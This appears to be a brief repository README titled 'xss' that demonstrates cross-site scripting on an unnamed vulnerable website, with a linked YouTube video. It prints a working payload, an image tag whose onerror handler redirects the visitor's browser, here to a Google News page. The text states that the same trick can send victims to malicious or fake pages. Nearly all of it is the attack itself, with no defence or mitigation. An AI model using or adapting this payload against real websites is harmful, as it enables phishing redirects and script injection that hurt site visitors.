# xss
Just a simple example of xss on a vulnerable website, in the example below, 
when the link is accessed, it is possible to redirect the person to a malicious page or even a fake page.

<h2>Used payload:</h2>
<code>&lt;img src="x"onerror=window.location="https://news.google.com/topstories?hl=pt-PT&gl=PT&ceid=PT:pt-150"&gt;
</code>

<h2>Demonstration : </h2>

[![xss](http://img.youtube.com/vi/D3jo_nYqNTc/0.jpg)](http://www.youtube.com/watch?v=D3jo_nYqNTc "xss")





